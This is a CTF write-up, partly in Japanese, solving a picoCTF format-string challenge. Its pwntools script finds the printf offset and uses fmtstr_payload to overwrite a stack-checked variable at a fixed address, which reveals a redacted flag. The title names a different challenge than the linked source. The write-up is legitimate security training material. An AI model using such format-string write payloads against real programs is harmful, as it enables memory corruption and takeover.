# heap_only_1:bynary Medium  
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!   

Download the source [here](format_string_2.c)  

Additional details will be available after launching your challenge instance.  

# Solution  
ssh接続する  
from pwn import *  
>>>   
>>> context.log_level = "critical"  
>>> context.binary = ELF('./vuln')  
>>>   
>>> p = remote('rhea.picoctf.net',60152)  
>>>   
>>> def exec_fmt(payload):  
...  p = remote('rhea.picoctf.net',60152)  
...  p.sendline(payload)  
...  return p.recvall()  
...   
>>> autofmt = FmtStr(exec_fmt)  
>>> offset = autofmt.offset  
>>>   
>>> payload = fmtstr_payload(offset, {0x404060: 0x67616c66})  
>>>   
>>> p.sendline(payload)  
>>>   
>>> flag = p.recvall()  
>>>   
>>> print("Flag: ", flag)  
Flag:  b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\nHere's your   input:                                                                                                        uc     \x00                                                                                                                                                                                                                                                      \x00aaaaba`@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{....}"  

# 基礎知識    
gdb    
プログラムのデバッグ（バグの原因調査） に使われる代表的なツールです    
pwntools    
CTFやバイナリ解析、バイナリエクスプロイトの自動化を目的としたPythonライブラリ    

# 考えたこと    
コードを見ると「printf(buf);」という記述があり、fmbを使えることがわかった  
そこから、fmbを使ってオフセットを取得。  
gdbを使って、sus変数のアドレスを特定。  
その後、進展がなく断念した。  
noamgariani11様のwriteupを参考し、解答に至った  
[参考にしたwriteup](https://github.com/noamgariani11/picoCTF-2024-Writeup/blob/main/Binary%20Explotation/format-string-2.md)  